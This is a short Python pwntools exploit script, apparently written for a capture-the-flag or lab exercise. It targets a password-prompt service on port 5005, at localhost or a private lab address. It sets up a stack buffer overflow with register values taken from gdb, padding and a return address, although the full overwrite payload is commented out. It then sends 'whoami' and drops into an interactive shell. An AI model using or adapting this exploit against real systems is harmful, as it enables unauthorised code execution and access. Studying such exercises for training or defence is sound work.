#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys
from pwn import *
from struct import pack, unpack


# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

# in pop order
MAGIC_EBX = 0x3 # as from gdb
MAGIC_ESI = 0x4 # as from gdb
MAGIC_EDI = 0xffffcf80
MAGIC_EBP = 0xffffcfa8
MAGIC_RETVAL = 0x3030392A # a nice place to return to

# padding
MAGIC_LENGTH = 40


if "remote" in sys.argv[1:]:
    conn = remote("192.168.40.51", 5005)
else:
    conn = remote("localhost", 5005)

recieved = conn.recvuntil("Password: ")
log.info("Recieved password prompt")
log.info("Sending payload")

# Can't use NULL for padding in this level
#payload = "A" * MAGIC_LENGTH + str(p32(MAGIC_EBX)) + str(p32(MAGIC_ESI)) + str(p32(MAGIC_EDI)) + str(p32(MAGIC_EBP)) + str(p32(MAGIC_RETVAL))
payload = "\x0AA" 
conn.sendline(payload)
conn.sendline("whoami")
print conn.recv()

conn.interactive()
